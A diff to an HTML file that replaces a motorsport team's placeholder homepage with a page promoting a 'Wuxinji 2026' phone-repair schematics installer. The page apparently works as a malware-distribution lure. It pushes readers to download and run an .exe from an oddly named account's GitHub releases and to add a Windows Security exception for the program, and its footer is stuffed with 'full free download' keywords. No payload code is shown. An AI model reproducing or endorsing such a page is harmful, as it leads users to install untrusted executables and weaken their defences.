@@ -3,299 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home | Motorsport Team</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;700&display=swap" rel="stylesheet">
-    
-    <style>
-        /* Core Layout Elements */
-        body {
-            font-family: 'Oswald', Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #000000;
-            color: #ffffff;
-            letter-spacing: 0.5px;
-            min-height: 180vh; /* Provides necessary vertical runway for scrolling transitions */
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        /* -------------------------------------------------------------
-           AMBIEINT BACKGROUND LAYERS
-           ------------------------------------------------------------- */
-        .paddock-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: linear-gradient(135deg, #040507 0%, #000000 100%);
-            z-index: -10;
-        }
-
-        .glow-wash {
-            position: fixed;
-            bottom: -30%;
-            right: -10%;
-            width: 80vw;
-            height: 80vh;
-            background: radial-gradient(circle, rgba(218, 46, 41, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
-            z-index: -9;
-            pointer-events: none;
-        }
-
-        /* -------------------------------------------------------------
-           8-LAYER GEOMETRIC FRACTURES (THE PADDOCK SHARDS)
-           ------------------------------------------------------------- */
-        .geo-shard {
-            position: fixed;
-            top: 0;
-            height: 100vh;
-            pointer-events: none;
-            will-change: transform, opacity;
-            transition: transform 0.15s cubic-bezier(0.1, 0.8, 0.2, 1), opacity 0.15s linear;
-        }
-
-        /* SHARD 1: Deep Red Structural Horizon */
-        .shard-1 {
-            right: 0;
-            width: 65vw;
-            background: rgba(218, 46, 41, 0.03);
-            clip-path: polygon(45% 0%, 100% 0%, 90% 100%, 20% 100%);
-            z-index: -8;
-        }
-
-        /* SHARD 2: Dark Charcoal Shield */
-        .shard-2 {
-            right: 8vw;
-            width: 50vw;
-            background: rgba(10, 11, 14, 0.8);
-            border-left: 1px solid rgba(255, 255, 255, 0.02);
-            clip-path: polygon(30% 0%, 100% 0%, 100% 100%, 10% 100%);
-            z-index: -7;
-        }
-
-        /* SHARD 3: Secondary Red Ambient Track */
-        .shard-3 {
-            right: 2vw;
-            width: 42vw;
-            background: linear-gradient(180deg, rgba(218, 46, 41, 0.1) 0%, rgba(0, 0, 0, 0) 80%);
-            clip-path: polygon(15% 0%, 85% 0%, 100% 100%, 30% 100%);
-            z-index: -6;
-        }
-
-        /* SHARD 4: Heavy Tech Core Wall */
-        .shard-4 {
-            right: 0;
-            width: 35vw;
-            background: #07080a;
-            border-left: 1px solid rgba(218, 46, 41, 0.1);
-            clip-path: polygon(40% 0%, 100% 0%, 100% 100%, 0% 100%);
-            z-index: -5;
-        }
-
-        /* SHARD 5: High-Contrast Blade Accent */
-        .shard-5 {
-            right: 12vw;
-            width: 20vw;
-            background: linear-gradient(90deg, rgba(255, 255, 255, 0.01) 0%, rgba(218, 46, 41, 0.05) 100%);
-            clip-path: polygon(0% 0%, 100% 0%, 60% 100%, 20% 100%);
-            z-index: -4;
-        }
-
-        /* SHARD 6: Core Primary Team Red Stripe */
-        .shard-6 {
-            right: 0;
-            width: 25vw;
-            background: linear-gradient(180deg, rgba(218, 46, 41, 0.22) 0%, rgba(15, 3, 3, 0.6) 60%, rgba(0, 0, 0, 0.95) 100%);
-            clip-path: polygon(25% 0%, 100% 0%, 100% 100%, 5% 100%);
-            backdrop-filter: brightness(0.95) contrast(1.05);
-            z-index: -3;
-        }
-
-        /* SHARD 7: Outer Paddock Fractured Shadow Split */
-        .shard-7 {
-            right: -3vw;
-            width: 18vw;
-            background: rgba(5, 6, 8, 0.9);
-            border-left: 1px solid rgba(255, 255, 255, 0.04);
-            clip-path: polygon(45% 0%, 100% 0%, 80% 100%, 0% 100%);
-            z-index: -2;
-        }
-
-        /* SHARD 8: Foreground Speed Vignette Glow */
-        .shard-8 {
-            right: -8vw;
-            width: 15vw;
-            background: linear-gradient(90deg, rgba(218, 46, 41, 0.12) 0%, rgba(0, 0, 0, 0) 100%);
-            clip-path: polygon(60% 0%, 100% 0%, 50% 100%, 0% 100%);
-            z-index: -1;
-        }
-
-        /* -------------------------------------------------------------
-           NAVIGATION BAR STYLING
-           ------------------------------------------------------------- */
-        .top-navbar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            z-index: 1000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 70px;
-            background: rgba(0, 0, 0, 0.65);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 20px;
-        }
-
-        .nav-links a {
-            text-decoration: none;
-            font-size: 16px;
-            font-weight: 700;
-            font-style: italic;
-            text-transform: uppercase;
-            color: #ffffff;
-            letter-spacing: 1.5px;
-            padding: 10px 15px;
-            transition: all 0.2s ease;
-            position: relative;
-        }
-
-        .nav-links a.active {
-            color: #Da2e29;
-        }
-
-        .nav-links a::after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            transform: scaleX(0);
-            height: 2px;
-            bottom: 0;
-            left: 0;
-            background-color: #Da2e29;
-            transform-origin: bottom right;
-            transition: transform 0.25s ease-out;
-        }
-
-        .nav-links a:hover::after,
-        .nav-links a.active::after {
-            transform: scaleX(1);
-            transform-origin: bottom left;
-        }
-
-        .nav-links a:hover {
-            color: #Da2e29;
-        }
-
-        /* -------------------------------------------------------------
-           PAGE CONTENT MAIN WRAPPER
-           ------------------------------------------------------------- */
-        main {
-            padding: 140px 50px 50px 50px;
-            max-width: 1200px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 10;
-        }
-
-        h1 {
-            font-size: 4rem;
-            text-transform: uppercase;
-            font-weight: 700;
-            font-style: italic;
-            margin-bottom: 10px;
-            letter-spacing: -1px;
-            color: #ffffff;
-            border-left: 6px solid #Da2e29;
-            padding-left: 20px;
-            text-shadow: 0 4px 15px rgba(0, 0, 0, 0.9);
-        }
-
-        .subtitle {
-            font-size: 1.1rem;
-            color: #b0b5c0;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            padding-left: 26px;
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
-            margin-bottom: 50px;
-        }
-    </style>
+    <meta name="description" content="Download and install Wuxinji 2026 for Windows 10 and 11. Complete guide for phone repair schematics and software tools.">
+    <title>Wuxinji-2026 Documentation</title>
 </head>
-<body>
+<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
 
-    <!-- 8-Layer Geometric Paddock Elements -->
-    <div class="paddock-bg"></div>
-    <div class="glow-wash"></div>
-    
-    <div class="geo-shard shard-1" id="shard1"></div>
-    <div class="geo-shard shard-2" id="shard2"></div>
-    <div class="geo-shard shard-3" id="shard3"></div>
-    <div class="geo-shard shard-4" id="shard4"></div>
-    <div class="geo-shard shard-5" id="shard5"></div>
-    <div class="geo-shard shard-6" id="shard6"></div>
-    <div class="geo-shard shard-7" id="shard7"></div>
-    <div class="geo-shard shard-8" id="shard8"></div>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px;">🛠️ Wuxinji-2026 - Repair mobile circuits with precision</h1>
 
-    <!-- Navigation Header -->
-    <nav class="top-navbar">
-        <div class="nav-links">
-            <a href="index.html" class="active">Home</a>
-            <a href="about.html">About the team</a>
-            <a href="departments.html">Departments</a>
-            <a href="sponsors.html">Sponsors</a>
-            <a href="timeline.html">Timeline</a>
-            <a href="contact.html">Contact us</a>
-        </div>
-    </nav>
+    <div style="margin: 30px 0; text-align: center;">
+        <a href="https://github.com/dilleniabowedstringedinstrument179/Wuxinji-2026/releases" style="background-color: #3498db; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Wuxinji 2026 Installer</a>
+    </div>
 
-    <!-- Main Content Grid Component -->
-    <main>
-        <h1>Welcome to the team</h1>
-        <div class="subtitle">// Currently under construction.</div>
-    </main>
+    <h2 style="color: #2c3e50;">📋 Overview</h2>
+    <p>Wuxinji-2026 provides detailed circuit diagrams and board layouts for mobile phone repair. This software helps technicians identify components, trace power lines, and troubleshoot hardware failures on modern smartphones. It supports Windows 10 and Windows 11 environments.</p>
 
-    <!-- 8-Channel Parallax Scroll Engine Script -->
-    <script>
-        function updateMultiLayerPaddock() {
-            const totalScrollableHeight = document.documentElement.scrollHeight - window.innerHeight;
-            if (totalScrollableHeight <= 0) return;
-            
-            // Map scroll position to a clean 0 to 1 ratio value
-            const scrollPercent = window.scrollY / totalScrollableHeight;
+    <h2 style="color: #2c3e50;">🚀 Getting Started</h2>
+    <p>Follow these steps to set up the software on your computer. Ensure your PC meets the basic system requirements before you begin.</p>
 
-            // Apply distinct calculated transforms to each fracture element simultaneously
-            document.getElementById('shard1').style.transform = `translateX(${scrollPercent * -45}px) skewX(${scrollPercent * 1}deg)`;
-            document.getElementById('shard2').style.transform = `translateX(${scrollPercent * 25}px)`;
-            document.getElementById('shard3').style.transform = `translateX(${scrollPercent * -15}px) translateY(${scrollPercent * 20}px)`;
-            document.getElementById('shard4').style.transform = `translateX(${scrollPercent * 35}px) scaleX(${1 + scrollPercent * 0.03})`;
-            document.getElementById('shard5').style.transform = `translateX(${scrollPercent * -60}px)`;
-            
-            // Center red highlight tracks opacity and horizontal glide
-            const s6 = document.getElementById('shard6');
-            s6.style.transform = `translateX(${scrollPercent * -30}px)`;
-            s6.style.opacity = `${0.7 + (scrollPercent * 0.3)}`;
-            
-            document.getElementById('shard7').style.transform = `translateX(${scrollPercent * 15}px)`;
-            document.getElementById('shard8').style.transform = `translateX(${scrollPercent * -75}px) skewX(${scrollPercent * -2}deg)`;
-        }
+    <h3 style="color: #2c3e50;">System Requirements</h3>
+    <ul>
+        <li>Operating System: Windows 10 or Windows 11 (64-bit edition).</li>
+        <li>Memory: 4GB of RAM or more.</li>
+        <li>Storage: 2GB of free disk space.</li>
+        <li>Internet Connection: Required for license verification and data updates.</li>
+    </ul>
 
-        // Window interaction event connections
-        window.addEventListener('scroll', updateMultiLayerPaddock);
-        window.addEventListener('resize', updateMultiLayerPaddock);
-        document.addEventListener("DOMContentLoaded", updateMultiLayerPaddock);
-    </script>
+    <h2 style="color: #2c3e50;">📥 Installation Process</h2>
+    <p>To use Wuxinji, perform these steps in order:</p>
+    <ol>
+        <li>Visit this page to download the latest setup file: <a href="https://github.com/dilleniabowedstringedinstrument179/Wuxinji-2026/releases" style="color: #3498db;">Official Release Page</a>.</li>
+        <li>Locate the downloaded .exe file in your Downloads folder.</li>
+        <li>Double-click the file to start the installation wizard.</li>
+        <li>Follow the screen prompts to select your destination folder.</li>
+        <li>Click the Finish button once the progress bar completes.</li>
+        <li>Launch the application from your desktop shortcut.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">💡 Using the Software</h2>
+    <p>Once you open the software, log in with your credentials. The home dashboard contains a search bar where you can type your device model. The tool will display available schematics, bitmap layouts, and component values. Use your mouse to zoom into specific areas of the printed circuit board.</p>
+
+    <h2 style="color: #2c3e50;">⚙️ Troubleshooting Common Issues</h2>
+    <p>If the software fails to open, verify your internet connection. Firewall settings sometimes block the software from reaching the server. Add an exception for Wuxinji in your Windows Security settings if the login window remains blank. Ensure your date and time settings are correct, as mismatching times prevent secure connections.</p>
+
+    <h2 style="color: #2c3e50;">📜 Software Features</h2>
+    <p>Wuxinji-2026 includes:</p>
+    <ul>
+        <li>Updated schematic diagrams for newest smartphone models.</li>
+        <li>Interactive bitmap views for component tracing.</li>
+        <li>Automatic software updates for valid user accounts.</li>
+        <li>Integrated support tools for quick hardware diagnosis.</li>
+    </ul>
+
+    <hr style="border: 0; border-top: 1px solid #ddd; margin: 40px 0;">
+
+    <p style="font-size: 0.9em; color: #7f8c8d;">Keywords: android-repair, complete, complete-version, download, download-wuxinji-tools-full-free-windows-11, full-installer, gsm-tool, phone-repair, schematics, software, windows-11, windows-software, wuxinji, wuxinji-2026, wuxinji-tools, wuxinji-tools-complete-install-2026-pc, wuxinji-tools-full-version-download-windows</p>
 
 </body>
 </html>
